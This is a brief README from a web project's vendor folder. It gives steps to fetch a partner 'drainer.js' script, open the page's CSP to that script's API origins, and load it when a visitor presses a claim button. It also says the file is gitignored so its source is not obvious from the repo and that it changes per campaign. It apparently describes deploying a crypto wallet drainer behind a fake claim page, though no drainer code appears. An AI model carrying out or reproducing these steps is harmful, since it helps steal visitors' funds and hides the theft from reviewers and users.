# vendor

Drop the partner's claim script here as `drainer.js`.

That's the only file that has to exist for the claim button to do anything.
The script is served from our own origin, so the page CSP stays at `script-src 'self'`.

## Steps

1. `node ../scripts/fetch-drainer.mjs --url <partner-script-url>`
2. Check `drainer.sha256` and keep it — re-check after every update
3. Add the script's API origin(s) to `connect-src` in `index.html`
4. Uncomment the script tag in `index.html` **or** leave it commented and let `app.js` inject it on claim

`drainer.js` is gitignored on purpose: the file changes per campaign and the source shouldn't be obvious from the repo.
